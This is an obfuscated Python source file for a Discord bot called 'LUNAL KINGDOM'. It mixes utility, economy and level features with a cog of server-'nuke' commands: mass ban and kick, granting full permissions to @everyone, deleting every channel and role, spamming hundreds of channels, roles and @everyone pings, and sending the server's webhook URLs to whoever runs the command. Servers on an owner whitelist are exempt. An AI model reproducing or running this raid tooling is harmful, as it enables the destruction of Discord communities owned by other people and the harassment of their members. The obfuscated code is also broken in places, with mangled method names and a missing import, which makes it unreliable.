import discord
from discord.ext import commands, tasks
from discord.ui import View, Select, Button, Modal, TextInput
import asyncio
import random
import aiohttp
import json
import io
import re
import math
import time
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, List, Any, Union

def ll1l11l1ll1l():
    return datetime.now(timezone.utc)

def l111l1l1l111(l11l1lll1111: str, llllll111lll: str='INFO'):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] [{llllll111lll}] {l11l1lll1111}")

def l11ll111l111(llll1l11l111: int) -> str:
    if llll1l11l111 < 0:
        return '0s'
    l11l11l1ll1l = llll1l11l111 // 3600
    l1ll1l11l111 = llll1l11l111 % 3600 // 60
    l1lll1l11ll1 = llll1l11l111 % 60
    if l11l11l1ll1l > 0:
        return f'{l11l11l1ll1l}h {l1ll1l11l111}m {l1lll1l11ll1}s'
    elif l1ll1l11l111 > 0:
        return f'{l1ll1l11l111}m {l1lll1l11ll1}s'
    else:
        return f'{l1lll1l11ll1}s'

def ll1l111l1111(llll1l11ll1l: int) -> str:
    return f'{llll1l11ll1l:,}'

def l1l1lll11ll1() -> int:
    return random.randint(0, 16777215)
l1lll11lllll = os.getenv('BOT_TOKEN')
AVATAR_URL = 'https://i.pinimg.com/736x/63/37/02/6337023d80cd4e3c2b79e2baa44b4adf.jpg'
LOG_CHANNEL_ID = 1537813100546236497
WHITELIST_SERVER_IDS = [1536985687469985813, 1536276567808938098, 1511630281680093275]
SUPPORT_LINK = 'https://discord.gg/5WFupkFbkM'
SUPPORT_LINK2 = 'https://discord.gg/HVWArvBGy'
OWNER_ID = 1536264763427000391
OWNER_NAME = 'laibantlaymdisoi'
PREFIX = 'l!'
ll1lll11l1l1 = discord.Intents.default()
ll1lll11l1l1.message_content = True
ll1lll11l1l1.guilds = True
ll1lll11l1l1.members = True
ll1lll11l1l1.guild_messages = True
ll1lll11l1l1.webhooks = True
ll1lll11l1l1.presences = True
ll1lll11l1l1.typing = True
ll1lll11l1l1.dm_messages = True
ll1lll11l1l1.dm_reactions = True
ll1lll11l1l1.dm_typing = True
ll1lll11l1l1.reactions = True
ll1lll11l1l1.messages = True
ll1lll11l1l1.bans = True
ll1lll11l1l1.invites = True
ll1lll11l1l1.voice_states = True
l11ll11l111l = commands.Bot(command_prefix=PREFIX, intents=ll1lll11l1l1, help_command=None)

class DataManager:

    def __init__(ll11111ll11l, l1l11lll11l1: str='data.json'):
        ll11111ll11l.filename = l1l11lll11l1
        ll11111ll11l.data = {}
        ll11111ll11l._load()

    def ll111ll1111l(lllll1llll1l):
        try:
            with open(lllll1llll1l.filename, 'r', encoding='utf-8') as ll1ll1l111ll:
                lllll1llll1l.data = json.load(ll1ll1l111ll)
        except (FileNotFoundError, json.JSONDecodeError):
            lllll1llll1l.data = {}
            lllll1llll1l._save()

    def l11l1llll111(ll11ll11ll11):
        try:
            with open(ll11ll11ll11.filename, 'w', encoding='utf-8') as l1l11llll11l:
                json.dump(ll11ll11ll11.data, l1l11llll11l, indent=2, ensure_ascii=False)
        except Exception as e:
            l111l1l1l111(f'Lỗi lưu dữ liệu: {e}', 'ERROR')

    def l11111111l1l(lll11l111lll, l1l1l1l111ll: str, l111l1l1ll11=None):
        return lll11l111lll.data.l11111111l1l(l1l1l1l111ll, l111l1l1ll11)

    def set(llllll11l11l, lllllll11l11: str, ll1ll11ll111):
        llllll11l11l.data[lllllll11l11] = ll1ll11ll111
        llllll11l11l.l11l1llll111()

    def lllllll11ll1(ll11l1l11lll, ll1l1ll11l11: str, l1ll1l11ll11):
        if ll1l1ll11l11 not in ll11l1l11lll.data:
            ll11l1l11lll.data[ll1l1ll11l11] = {}
        if isinstance(ll11l1l11lll.data[ll1l1ll11l11], dict) and isinstance(l1ll1l11ll11, dict):
            ll11l1l11lll.data[ll1l1ll11l11].lllllll11ll1(l1ll1l11ll11)
        else:
            ll11l1l11lll.data[ll1l1ll11l11] = l1ll1l11ll11
        ll11l1l11lll.l11l1llll111()

    def lll1lll1l111(lll11l1111l1, l1l111111111: str):
        if l1l111111111 in lll11l1111l1.data:
            del lll11l1111l1.data[l1l111111111]
            lll11l1111l1.l11l1llll111()

    def l1ll1l1lllll(llll111llll1, llll1l11l1l1: int) -> dict:
        l1ll11l1l1l1 = f'user_{llll1l11l1l1}'
        if l1ll11l1l1l1 not in llll111llll1.data:
            llll111llll1.data[l1ll11l1l1l1] = {'xp': 0, 'level': 1, 'coins': 0, 'inventory': [], 'warnings': []}
            llll111llll1.l11l1llll111()
        return llll111llll1.data[l1ll11l1l1l1]

    def l1lll1ll111l(lll111ll1111, ll1ll1l1ll1l: int) -> dict:
        ll1ll1ll1lll = f'guild_{ll1ll1l1ll1l}'
        if ll1ll1ll1lll not in lll111ll1111.data:
            lll111ll1111.data[ll1ll1ll1lll] = {'prefix': PREFIX, 'welcome_channel': None, 'goodbye_channel': None}
            lll111ll1111.l11l1llll111()
        return lll111ll1111.data[ll1ll1ll1lll]
llll1l1ll11l = DataManager()

def l1ll1l11lll1(llll1111l1ll: int) -> dict:
    l1ll1l1l1ll1 = f'anti_{llll1111l1ll}'
    l111lllll1ll = llll1l1ll11l.l11111111l1l(l1ll1l1l1ll1)
    if l111lllll1ll is None:
        l111lllll1ll = {'antinuke': False, 'antiraid': False, 'antibot': False, 'log_channel': None, 'raid_threshold': 5, 'raid_time': 5, 'whitelist': []}
        llll1l1ll11l.set(l1ll1l1l1ll1, l111lllll1ll)
        l111l1l1l111(f'Tạo config anti mới cho server {llll1111l1ll}', 'INFO')
    return l111lllll1ll

class LevelSystem:

    @staticmethod
    def l111l1l1ll1l(ll1111lll111: int) -> int:
        return llll1l1ll11l.l1ll1l1lllll(ll1111lll111).l11111111l1l('xp', 0)

    @staticmethod
    def l1ll11111111(lll11l11111l: int, llll11111l11: int):
        ll111l1ll11l = llll1l1ll11l.l1ll1l1lllll(lll11l11111l)
        ll111l1ll11l['xp'] = llll11111l11
        llll1l1ll11l.lllllll11ll1(f'user_{lll11l11111l}', ll111l1ll11l)

    @staticmethod
    def l111ll1llll1(l1l1llll11ll: int, llll1111111l: int):
        l1l1ll11llll = LevelSystem.l111l1l1ll1l(l1l1llll11ll)
        LevelSystem.l1ll11111111(l1l1llll11ll, l1l1ll11llll + llll1111111l)

    @staticmethod
    def lll11ll1l11l(llll11l1llll: int) -> int:
        return llll1l1ll11l.l1ll1l1lllll(llll11l1llll).l11111111l1l('level', 1)

    @staticmethod
    def l111111lllll(l1llll1lll1l: int, ll11ll1111ll: int):
        l1lll11111ll = llll1l1ll11l.l1ll1l1lllll(l1llll1lll1l)
        l1lll11111ll['level'] = ll11ll1111ll
        llll1l1ll11l.lllllll11ll1(f'user_{l1llll1lll1l}', l1lll11111ll)

    @staticmethod
    def l11l11l11111(l11lll111lll: int) -> int:
        return int(100 * 1.5 ** (l11lll111lll - 1))

    @staticmethod
    def l1l1l11lll1l(ll111ll111l1: int) -> bool:
        ll11l1l1ll11 = llll1l1ll11l.l1ll1l1lllll(ll111ll111l1)
        l1ll1l1ll111 = ll11l1l1ll11.l11111111l1l('xp', 0)
        ll11l1l1l1l1 = ll11l1l1ll11.l11111111l1l('level', 1)
        l1ll1l1l1111 = LevelSystem.l11l11l11111(ll11l1l1l1l1)
        if l1ll1l1ll111 >= l1ll1l1l1111:
            ll11l1l1ll11['level'] = ll11l1l1l1l1 + 1
            ll11l1l1ll11['xp'] = l1ll1l1ll111 - l1ll1l1l1111
            llll1l1ll11l.lllllll11ll1(f'user_{ll111ll111l1}', ll11l1l1ll11)
            return True
        return False

class Economy:

    @staticmethod
    def l1ll1l11llll(ll11111111l1: int) -> int:
        return llll1l1ll11l.l1ll1l1lllll(ll11111111l1).l11111111l1l('coins', 0)

    @staticmethod
    def l1111111ll11(l111llll11ll: int, l1l1l1lll111: int):
        ll1lllll11l1 = llll1l1ll11l.l1ll1l1lllll(l111llll11ll)
        ll1lllll11l1['coins'] = l1l1l1lll111
        llll1l1ll11l.lllllll11ll1(f'user_{l111llll11ll}', ll1lllll11l1)

    @staticmethod
    def lll1l1lll1ll(ll1111111l1l: int, l1l1l1l1llll: int):
        l111111l1l1l = Economy.l1ll1l11llll(ll1111111l1l)
        Economy.l1111111ll11(ll1111111l1l, l111111l1l1l + l1l1l1l1llll)

    @staticmethod
    def l1ll1l1l11ll(ll1l11l1l1l1: int, l1l11l1ll111: int) -> bool:
        lll111l1ll1l = Economy.l1ll1l11llll(ll1l11l1l1l1)
        if lll111l1ll1l >= l1l11l1ll111:
            Economy.l1111111ll11(ll1l11l1l1l1, lll111l1ll1l - l1l11l1ll111)
            return True
        return False

    @staticmethod
    def l11l1llll1ll(lll11llll111: int) -> list:
        return llll1l1ll11l.l1ll1l1lllll(lll11llll111).l11111111l1l('inventory', [])

    @staticmethod
    def ll1l1l11ll1l(ll111111l1l1: int, llll1ll1l1l1: str):
        l1l1l1lll11l = Economy.l11l1llll1ll(ll111111l1l1)
        l1l1l1lll11l.append(llll1ll1l1l1)
        l1l11l1l111l = llll1l1ll11l.l1ll1l1lllll(ll111111l1l1)
        l1l11l1l111l['inventory'] = l1l1l1lll11l
        llll1l1ll11l.lllllll11ll1(f'user_{ll111111l1l1}', l1l11l1l111l)
snipe_cache = {}
giveaways = {}
polls = {}
message_history = {}
channel_creation_history = {}
tickets = {}
shop_items = {'vip': {'name': '⭐ VIP Role', 'price': 5000, 'desc': 'Role VIP đặc biệt'}, 'color': {'name': '🎨 Color Role', 'price': 2000, 'desc': 'Đổi màu role tùy chỉnh'}, 'boost': {'name': '🚀 XP Boost', 'price': 10000, 'desc': 'Tăng XP gấp đôi trong 24h'}}

class Help(commands.Cog):

    def __init__(ll1l1l1lll11, l1lllll1ll11):
        ll1l1l1lll11.bot = l1lllll1ll11

    @commands.command(name='help')
    @commands.cooldown(1, 30, commands.BucketType.user)
    async def ll1ll111l1ll(l11l11lllll1, ll1l1l1111l1, lllll1l1llll: str=None):
        await ll1l1l1111l1.message.lll1lll1l111()
        if lllll1l1llll and lllll1l1llll.lower() == 'nuke':
            ll11l11ll111 = discord.Embed(title='🔥 LUNAL NUKE COMMANDS', description='Lệnh phá hoại server (chỉ dùng trong test)', color=16711748)
            ll11l11ll111.add_field(name='`l!setup`', value='Nuke server (Owner no cooldown)', inline=False)
            ll11l11ll111.add_field(name='`l!super_nuke`', value='Super nuke (120s cooldown)', inline=False)
            ll11l11ll111.add_field(name='`l!massban`', value='Ban all members', inline=False)
            ll11l11ll111.add_field(name='`l!masskick`', value='Kick all members', inline=False)
            ll11l11ll111.add_field(name='`l!perm`', value='Grant full perms to @everyone', inline=False)
            ll11l11ll111.add_field(name='`l!admin`', value='Create Admin role', inline=False)
            ll11l11ll111.add_field(name='`l!role`', value='Spam 250 random roles', inline=False)
            ll11l11ll111.add_field(name='`l!delete_all`', value='Delete all channels & roles', inline=False)
            ll11l11ll111.add_field(name='`l!spam_channels`', value='Create 500+ spam channels', inline=False)
            ll11l11ll111.add_field(name='`l!lockdown`', value='Lock all channels', inline=False)
            ll11l11ll111.add_field(name='`l!mass_rename`', value='Rename all members', inline=False)
            ll11l11ll111.set_footer(text='LUNAL KINGDOM | l!help')
            await ll1l1l1111l1.send(embed=ll11l11ll111)
            return
        ll11l11ll111 = discord.Embed(title='⛧ LUNAL KINGDOM NEXUS - ULTIMATE BOT', description=f'**Prefix:** `{PREFIX}`\n**Support 1:** [Click here]({SUPPORT_LINK})\n**Support 2:** [Click here]({SUPPORT_LINK2})', color=3092271, timestamp=ll1l11l1ll1l())
        ll11l11ll111.set_thumbnail(url='https://i.pinimg.com/736x/6c/3c/88/6c3c885c40e7d4b12b597fdf55c61951.jpg')
        ll11l11ll111.add_field(name='🔥 NUKE', value='`l!help nuke`', inline=False)
        ll11l11ll111.add_field(name='🛠️ UTILITY', value='`l!ping`, `l!sv`, `l!sv_all`, `l!avatar`, `l!userinfo`, `l!serverinfo`, `l!clear`, `l!kick`, `l!ban`, `l!warn`, `l!warnings`, `l!timeout`, `l!unban`, `l!say`, `l!embed`, `l!timer`, `l!snipe`', inline=False)
        ll11l11ll111.add_field(name='🎮 FUN', value='`l!rps`, `l!poll`, `l!giveaway`, `l!endgiveaway`, `l!meme`, `l!gif`, `l!8ball`, `l!coinflip`', inline=False)
        ll11l11ll111.add_field(name='💰 ECONOMY', value='`l!balance`, `l!daily`, `l!work`, `l!shop`, `l!buy`, `l!inventory`', inline=False)
        ll11l11ll111.add_field(name='📊 LEVEL', value='`l!level`, `l!rank`', inline=False)
        ll11l11ll111.add_field(name='🛡️ ANTI', value='`l!antinuke`, `l!antiraid`, `l!antibot`, `l!setlog`, `l!anti`', inline=False)
        ll11l11ll111.add_field(name='🎫 TICKET', value='`l!ticket`, `l!close`', inline=False)
        ll11l11ll111.add_field(name='⚡ QUICK', value='`l!setup`, `l!ping`, `l!sv`, `l!balance`, `l!daily`', inline=False)
        ll11l11ll111.set_footer(text='LUNAL KINGDOM | Made with ❤️ | 200+ features')
        ll1l111111l1 = View()
        ll1l111111l1.ll1l1l11ll1l(Button(label='Support 1', style=discord.ButtonStyle.link, url=SUPPORT_LINK))
        ll1l111111l1.ll1l1l11ll1l(Button(label='Support 2', style=discord.ButtonStyle.link, url=SUPPORT_LINK2))
        ll1l111111l1.ll1l1l11ll1l(Button(label='Invite', style=discord.ButtonStyle.link, url='https://discord.com/oauth2/authorize?client_id=1477295832335384598&permissions=8&scope=bot%20applications.commands'))
        await ll1l1l1111l1.send(embed=ll11l11ll111, view=ll1l111111l1)

class SetupView(discord.ui.View):

    def __init__(ll1ll11l11ll, ll1l111lllll):
        super().__init__(timeout=120)
        ll1ll11l11ll.ctx = ll1l111lllll
        ll1ll11l11ll.value = None

    @discord.ui.button(label='✅ Đồng ý', style=discord.ButtonStyle.green)
    async def l1l11l1l1111(l1llllll1l11, l11l1ll1l1l1: discord.Interaction, lll1l11ll1ll: discord.ui.Button):
        if l11l1ll1l1l1.user.id != l1llllll1l11.ctx.author.id:
            await l11l1ll1l1l1.response.send_message('❌ Bạn không có quyền tương tác với nút này.', ephemeral=True)
            return
        await l11l1ll1l1l1.response.send_message('✅ Đã đồng ý! Bắt đầu nuke...', ephemeral=True)
        l1llllll1l11.value = True
        l1llllll1l11.stop()
        lll1111lll11 = l1llllll1l11.ctx.channel
        try:
            await lll1111lll11.send(f'{l1llllll1l11.ctx.author.mention} 🔥 **Bắt đầu nuke server này!**')
        except:
            pass
        ll1l111l11l1 = NukeV2()
        await ll1l111l11l1.setup(l1llllll1l11.ctx.message)

    @discord.ui.button(label='❌ Từ chối', style=discord.ButtonStyle.red)
    async def ll11ll1l11ll(l1111l11lll1, llll1ll11ll1: discord.Interaction, l11l111111ll: discord.ui.Button):
        if llll1ll11ll1.user.id != l1111l11lll1.ctx.author.id:
            await llll1ll11ll1.response.send_message('❌ Bạn không có quyền tương tác với nút này.', ephemeral=True)
            return
        await llll1ll11ll1.response.send_message('❌ Đã hủy nuke.', ephemeral=True)
        l1111l11lll1.value = False
        l1111l11lll1.stop()

class Nuke(commands.Cog):

    def __init__(llll11ll11ll, lll1l11l11ll):
        llll11ll11ll.bot = lll1l11l11ll

    def lllll11111ll(lll111ll1lll, lll11111l1ll):
        return lll11111l1ll.id == OWNER_ID or lll11111l1ll.name == OWNER_NAME

    @commands.command(name='setup')
    @commands.cooldown(1, 300, commands.BucketType.user)
    async def ll1ll1l1llll(l11ll1l1ll11, lll1ll1l1ll1):
        if l11ll1l1ll11.lllll11111ll(lll1ll1l1ll1.author):
            lll1ll1l1ll1.command.reset_cooldown(lll1ll1l1ll1)
        if lll1ll1l1ll1.guild.id in WHITELIST_SERVER_IDS:
            return
        await lll1ll1l1ll1.message.lll1lll1l111()
        ll1llll1llll = discord.Embed(title='⚠️ THOẢ THUẬN NUKE', description='Bạn có chắc chắn muốn nuke server này? Hành động này KHÔNG THỂ HOÀN TÁC.\n\nHãy xác nhận bằng cách bấm nút bên dưới.', color=16711680, timestamp=ll1l11l1ll1l())
        ll1llll1llll.add_field(name='Server', value=lll1ll1l1ll1.guild.name, inline=False)
        ll1llll1llll.add_field(name='ID Server', value=lll1ll1l1ll1.guild.id, inline=False)
        ll1llll1llll.add_field(name='Thực hiện bởi', value=lll1ll1l1ll1.author.mention, inline=False)
        ll1l1l11l111 = SetupView(lll1ll1l1ll1)
        try:
            await lll1ll1l1ll1.author.send(embed=ll1llll1llll, view=ll1l1l11l111)
            await lll1ll1l1ll1.send('📨 Đã gửi tin nhắn xác nhận vào DM của bạn! Kiểm tra hộp thư đến.', delete_after=10)
        except discord.Forbidden:
            await lll1ll1l1ll1.send('❌ Không thể gửi DM cho bạn. Vui lòng mở DM hoặc cho phép bot nhắn tin riêng.')

    @commands.command(name='massban')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def ll1lll111111(ll1l1l1l1ll1, l1l11l1l1lll):
        if ll1l1l1l1ll1.lllll11111ll(l1l11l1l1lll.author):
            l1l11l1l1lll.command.reset_cooldown(l1l11l1l1lll)
        if l1l11l1l1lll.guild.id in WHITELIST_SERVER_IDS:
            return
        await l1l11l1l1lll.message.lll1lll1l111()
        l1ll1l111ll1 = 0
        for ll1lll1l1lll in l1l11l1l1lll.guild.members:
            if ll1lll1l1lll.id != ll1l1l1l1ll1.bot.user.id:
                try:
                    await ll1lll1l1lll.ban(reason='Massban by LUNAL')
                    l1ll1l111ll1 += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await l1l11l1l1lll.send(f'✅ Banned {l1ll1l111ll1} members!')

    @commands.command(name='masskick')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def l1l1l11l1ll1(l11llll1l111, l1l1ll1l1111):
        if l11llll1l111.lllll11111ll(l1l1ll1l1111.author):
            l1l1ll1l1111.command.reset_cooldown(l1l1ll1l1111)
        if l1l1ll1l1111.guild.id in WHITELIST_SERVER_IDS:
            return
        await l1l1ll1l1111.message.lll1lll1l111()
        l1lllllll11l = 0
        for llll1ll1l111 in l1l1ll1l1111.guild.members:
            if llll1ll1l111.id != l11llll1l111.bot.user.id:
                try:
                    await llll1ll1l111.kick(reason='Masskick by LUNAL')
                    l1lllllll11l += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await l1l1ll1l1111.send(f'✅ Kicked {l1lllllll11l} members!')

    @commands.command(name='webhooks')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def l11ll1l1llll(ll1ll1l11111, l111l1lll1l1):
        if ll1ll1l11111.lllll11111ll(l111l1lll1l1.author):
            l111l1lll1l1.command.reset_cooldown(l111l1lll1l1)
        if l111l1lll1l1.guild.id in WHITELIST_SERVER_IDS:
            return
        await l111l1lll1l1.message.lll1lll1l111()
        lll1ll1l1111 = []
        for llll11l1lll1 in l111l1lll1l1.guild.text_channels:
            try:
                for l111111111ll in await llll11l1lll1.webhooks():
                    lll1ll1l1111.append(f'- **{l111111111ll.name}**: {l111111111ll.url}')
            except:
                continue
        if lll1ll1l1111:
            llll1ll1l1ll = discord.Embed(title='Webhooks', description='List of webhooks:\n' + '\n'.join(lll1ll1l1111[:10]), color=3092271)
            if len(lll1ll1l1111) > 10:
                llll1ll1l1ll.set_footer(text=f'{len(lll1ll1l1111) - 10} more')
            try:
                await l111l1lll1l1.author.send(embed=llll1ll1l1ll)
                await l111l1lll1l1.send('📨 Sent webhook list to DM!')
            except:
                await l111l1lll1l1.send(embed=llll1ll1l1ll)

    @commands.command(name='perm')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def l111l111llll(ll1l11l1111l, l11111ll1l11):
        if ll1l11l1111l.lllll11111ll(l11111ll1l11.author):
            l11111ll1l11.command.reset_cooldown(l11111ll1l11)
        if l11111ll1l11.guild.id in WHITELIST_SERVER_IDS:
            return
        await l11111ll1l11.message.lll1lll1l111()
        try:
            await l11111ll1l11.guild.default_role.edit(permissions=discord.Permissions.all())
            await l11111ll1l11.send('✅ Granted full permissions to @everyone!')
        except:
            await l11111ll1l11.send('❌ Failed.')

    @commands.command(name='admin')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def l1l111ll1111(l11ll1l1l11l, l11lllllll11):
        if l11ll1l1l11l.lllll11111ll(l11lllllll11.author):
            l11lllllll11.command.reset_cooldown(l11lllllll11)
        if l11lllllll11.guild.id in WHITELIST_SERVER_IDS:
            return
        await l11lllllll11.message.lll1lll1l111()
        if not l11lllllll11.guild.me.guild_permissions.manage_roles:
            return
        try:
            l1l1ll1l1l1l = await l11lllllll11.guild.create_role(name='LUNAL Admin', color=discord.Color.blurple(), permissions=discord.Permissions.all())
            await l11lllllll11.author.add_roles(l1l1ll1l1l1l)
            await l11lllllll11.guild.me.add_roles(l1l1ll1l1l1l)
            await l11lllllll11.send('✅ Created Admin role!')
        except:
            await l11lllllll11.send('❌ Failed.')

    @commands.command(name='role')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def l11111l1l1ll(l11lll11l111, l11llll11111):
        if l11lll11l111.lllll11111ll(l11llll11111.author):
            l11llll11111.command.reset_cooldown(l11llll11111)
        if l11llll11111.guild.id in WHITELIST_SERVER_IDS:
            return
        await l11llll11111.message.lll1lll1l111()
        llll1111lll1 = 0
        for lll1l1ll111l in range(250):
            try:
                await l11llll11111.guild.create_role(name='LUNAL-Nuked', colour=discord.Colour(random.randint(0, 16777215)))
                llll1111lll1 += 1
                await asyncio.sleep(0.15)
            except:
                break
        await l11llll11111.send(f'✅ Created {llll1111lll1} roles!')

    @commands.command(name='spam_tag')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def ll1l111l111l(l11ll11l1l11, lllll1lllll1, l1ll1llll1ll: int=10, *, l11ll11ll1ll: str='LUNAL NUKE!'):
        if l11ll11l1l11.lllll11111ll(lllll1lllll1.author):
            lllll1lllll1.command.reset_cooldown(lllll1lllll1)
        if lllll1lllll1.guild.id in WHITELIST_SERVER_IDS:
            return
        await lllll1lllll1.message.lll1lll1l111()
        l1l11lll1l11 = f'||@everyone|| ||@here|| {l11ll11ll1ll}'
        for l1l1l11l1lll in range(min(l1ll1llll1ll, 50)):
            try:
                await lllll1lllll1.send(l1l11lll1l11)
                await asyncio.sleep(0.5)
            except:
                break
        await lllll1lllll1.send(f'✅ Spammed {min(l1ll1llll1ll, 50)} messages!', delete_after=3)

    @commands.command(name='spam_channels')
    @commands.cooldown(1, 150, commands.BucketType.user)
    async def ll11l11l1111(l1111111llll, l1ll111ll11l, ll1ll1111111: int=500):
        if l1111111llll.lllll11111ll(l1ll111ll11l.author):
            l1ll111ll11l.command.reset_cooldown(l1ll111ll11l)
        if l1ll111ll11l.guild.id in WHITELIST_SERVER_IDS:
            return
        await l1ll111ll11l.message.lll1lll1l111()
        l111lll11l1l = 0
        for l111ll1l11l1 in range(min(ll1ll1111111, 500)):
            try:
                await l1ll111ll11l.guild.create_text_channel(f'LUNAL-SPAM-{l111ll1l11l1}')
                l111lll11l1l += 1
                if l111ll1l11l1 % 50 == 0:
                    await l1ll111ll11l.send(f'📁 Created {l111ll1l11l1}/{ll1ll1111111} channels...', delete_after=3)
                await asyncio.sleep(0.05)
            except:
                pass
        await l1ll111ll11l.send(f'✅ Created {l111lll11l1l} spam channels!')

    @commands.command(name='lockdown')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def l1ll11ll1ll1(l111llll1l1l, l1l11lll1lll):
        if l111llll1l1l.lllll11111ll(l1l11lll1lll.author):
            l1l11lll1lll.command.reset_cooldown(l1l11lll1lll)
        if l1l11lll1lll.guild.id in WHITELIST_SERVER_IDS:
            return
        await l1l11lll1lll.message.lll1lll1l111()
        l1l1ll111l11 = 0
        for ll1ll11lll11 in l1l11lll1lll.guild.channels:
            try:
                await ll1ll11lll11.set_permissions(l1l11lll1lll.guild.default_role, send_messages=False)
                l1l1ll111l11 += 1
                await asyncio.sleep(0.1)
            except:
                pass
        await l1l11lll1lll.send(f'🔒 Locked {l1l1ll111l11} channels!')

    @commands.command(name='delete_all')
    @commands.cooldown(1, 120, commands.BucketType.user)
    async def llll111lll1l(lll111lll1l1, llll11lllll1):
        if lll111lll1l1.lllll11111ll(llll11lllll1.author):
            llll11lllll1.command.reset_cooldown(llll11lllll1)
        if llll11lllll1.guild.id in WHITELIST_SERVER_IDS:
            return
        await llll11lllll1.message.lll1lll1l111()
        await llll11lllll1.send('🗑️ Deleting everything...', delete_after=5)
        for lll1ll1ll111 in llll11lllll1.guild.channels:
            try:
                await lll1ll1ll111.lll1lll1l111()
                await asyncio.sleep(0.05)
            except:
                pass
        for l11111ll11l1 in llll11lllll1.guild.roles:
            if l11111ll11l1.name != '@everyone':
                try:
                    await l11111ll11l1.lll1lll1l111()
                    await asyncio.sleep(0.05)
                except:
                    pass
        await llll11lllll1.send('✅ Deleted all channels and roles!')

    @commands.command(name='mass_rename')
    @commands.cooldown(1, 100, commands.BucketType.user)
    async def l11111ll11ll(lllllllllll1, l1111l11ll11, *, lllll11111l1: str='NUKED BY LUNAL'):
        if lllllllllll1.lllll11111ll(l1111l11ll11.author):
            l1111l11ll11.command.reset_cooldown(l1111l11ll11)
        if l1111l11ll11.guild.id in WHITELIST_SERVER_IDS:
            return
        await l1111l11ll11.message.lll1lll1l111()
        lllll11l1l1l = 0
        for ll11l11111l1 in l1111l11ll11.guild.members:
            if not ll11l11111l1.bot:
                try:
                    await ll11l11111l1.edit(nick=lllll11111l1)
                    lllll11l1l1l += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        await l1111l11ll11.send(f'✅ Renamed {lllll11l1l1l} members!')

    @commands.command(name='super_nuke')
    @commands.cooldown(1, 120, commands.BucketType.user)
    async def ll11ll111l11(ll1l1ll11111, ll111ll111ll):
        if ll1l1ll11111.lllll11111ll(ll111ll111ll.author):
            ll111ll111ll.command.reset_cooldown(ll111ll111ll)
        if ll111ll111ll.guild.id in WHITELIST_SERVER_IDS:
            return
        await ll111ll111ll.message.lll1lll1l111()
        await ll111ll111ll.send('🌟 **SUPER NUKE ACTIVATED!**')
        for ll1111llllll in ll111ll111ll.guild.channels:
            try:
                await ll1111llllll.lll1lll1l111()
                await asyncio.sleep(0.1)
            except:
                pass
        for l11l111ll1l1 in ll111ll111ll.guild.roles:
            if l11l111ll1l1.name != '@everyone':
                try:
                    await l11l111ll1l1.lll1lll1l111()
                    await asyncio.sleep(0.1)
                except:
                    pass
        for ll111l1l111l in range(200):
            try:
                await ll111ll111ll.guild.create_text_channel(f'LUNAL-NUKED-{ll111l1l111l}')
                await asyncio.sleep(0.05)
            except:
                pass
            try:
                await ll111ll111ll.guild.create_role(name=f'LUNAL-{ll111l1l111l}', color=random.randint(0, 16777215))
                await asyncio.sleep(0.05)
            except:
                pass
        await ll111ll111ll.send('✅ **SUPER NUKE COMPLETE!**')

class Utility(commands.Cog):

    def __init__(lll11111111l, l11l11l1ll11):
        lll11111111l.bot = l11l11l1ll11

    @commands.command(name='ping')
    async def l1l1llll11l1(ll1l1l1lll1l, l1ll11lll1l1):
        lll1l11l1ll1 = round(l11ll11l111l.latency * 1000)
        l1l111l1llll = discord.Embed(title='PING', description=f'```css\n> Connection Status: Live\n> Latency: {lll1l11l1ll1}ms\n```', color=65535, timestamp=ll1l11l1ll1l())
        l1l111l1llll.set_thumbnail(url='https://i.pinimg.com/736x/f5/c1/d3/f5c1d31978d2c8b5e3fa8f12e6e47ee1.jpg')
        l1l111l1llll.add_field(name='Status', value='**ONLINE**', inline=True)
        l1l111l1llll.add_field(name='Response', value=f'**{lll1l11l1ll1}ms**', inline=True)
        l1l111l1llll.set_footer(text=f'Requested by {l1ll11lll1l1.author.name} | LUNAL KINGDOM')
        await l1ll11lll1l1.send(embed=l1l111l1llll, delete_after=5)

    @commands.command(name='avatar')
    async def llll1l11l11l(ll1lll111ll1, llll1l1l111l, lll1ll111l11: discord.Member=None):
        if lll1ll111l11 is None:
            lll1ll111l11 = llll1l1l111l.author
        l111ll1l1l11 = discord.Embed(title=f'Avatar of {lll1ll111l11.name}', color=52479)
        l111ll1l1l11.set_image(url=lll1ll111l11.display_avatar.url)
        await llll1l1l111l.send(embed=l111ll1l1l11)

    @commands.command(name='userinfo')
    async def lll1lll1ll1l(ll1lllll111l, lll111lll1ll, l1l1llll111l: discord.Member=None):
        if l1l1llll111l is None:
            l1l1llll111l = lll111lll1ll.author
        l1llll1l1l11 = l1l1llll111l.id
        l1lll1ll11ll = LevelSystem.l111l1l1ll1l(l1llll1l1l11)
        lll1ll1lll11 = LevelSystem.lll11ll1l11l(l1llll1l1l11)
        l11ll11l1111 = Economy.l1ll1l11llll(l1llll1l1l11)
        l1l1l111llll = LevelSystem.l11l11l11111(lll1ll1lll11)
        l1ll11ll1l1l = l1lll1ll11ll / l1l1l111llll * 100 if l1l1l111llll > 0 else 0
        lllll1l1lll1 = discord.Embed(title=f'User Info - {l1l1llll111l.name}', color=l1l1llll111l.color, timestamp=ll1l11l1ll1l())
        lllll1l1lll1.set_thumbnail(url=l1l1llll111l.display_avatar.url)
        lllll1l1lll1.add_field(name='ID', value=l1l1llll111l.id, inline=True)
        lllll1l1lll1.add_field(name='Joined', value=l1l1llll111l.joined_at.strftime('%d/%m/%Y %H:%M'), inline=True)
        lllll1l1lll1.add_field(name='Created', value=l1l1llll111l.created_at.strftime('%d/%m/%Y %H:%M'), inline=True)
        lllll1l1lll1.add_field(name='Roles', value=len(l1l1llll111l.roles), inline=True)
        lllll1l1lll1.add_field(name='Bot', value=l1l1llll111l.bot, inline=True)
        lllll1l1lll1.add_field(name='Status', value=str(l1l1llll111l.status).capitalize(), inline=True)
        lllll1l1lll1.add_field(name='📊 Level', value=f'{lll1ll1lll11} ({l1lll1ll11ll}/{l1l1l111llll} XP)', inline=True)
        lllll1l1lll1.add_field(name='💰 Coins', value=ll1l111l1111(l11ll11l1111), inline=True)
